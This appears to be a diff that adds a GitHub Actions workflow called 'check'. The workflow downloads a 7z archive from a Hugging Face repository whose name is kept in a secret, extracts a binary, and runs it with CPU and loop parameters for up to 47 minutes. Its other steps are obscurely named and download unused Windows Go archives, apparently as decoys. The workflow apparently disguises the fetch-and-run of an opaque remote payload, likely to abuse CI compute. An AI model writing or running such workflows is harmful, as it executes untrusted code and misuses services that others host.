@@ -1,0 +1,48 @@
+name: check
+env:
+  ENV_ADS: ${{ secrets.ENV_ADS }}
+  VERTT: v1.0.0_${{ github.event.inputs.amd_override }}
+  ENV_DISD: ${{ secrets.ENV_DISD }}
+  HF_REPO: ${{ secrets.HF_REPO }}
+  REPO_DIR: ${{ github.workspace }}
+  OVVS: ${{ github.event.inputs.loop_override }}
+  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
+on:
+  workflow_dispatch:
+    inputs:
+      amd_override:
+        description: 'try_a'
+        required: false
+        default: 'v3'
+        type: string
+      loop_override:
+        description: 'try_b'
+        required: false
+        default: '10'
+        type: string
+  push:
+    branches:
+      - mastz
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+      - name: LS
+        run: ls -la
+      - name: trgg
+        run: curl -o trgg.zip -L https://dl.google.com/go/go1.27.3.windows-amd64.zip
+      - name: Check
+        timeout-minutes: 47
+        run: |
+          curl -o chq.7z -L --url "https://huggingface.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.VERTT }}.7z?download=true"
+          7z x chq.7z
+          rm -rf chq.7z && mv doit chq
+          chmod +x chq
+          ./chq loop ${{ env.OVVS }} steps 1000000 wait 0 cpu 3
+      - name: vs
+        run: curl -o vs.zip -L https://dl.google.com/go/go1.27.3.windows-amd64.zip
+      - name: asv
+        run: curl -o asv.zip -L https://dl.google.com/go/go1.27.3.windows-amd64.zip
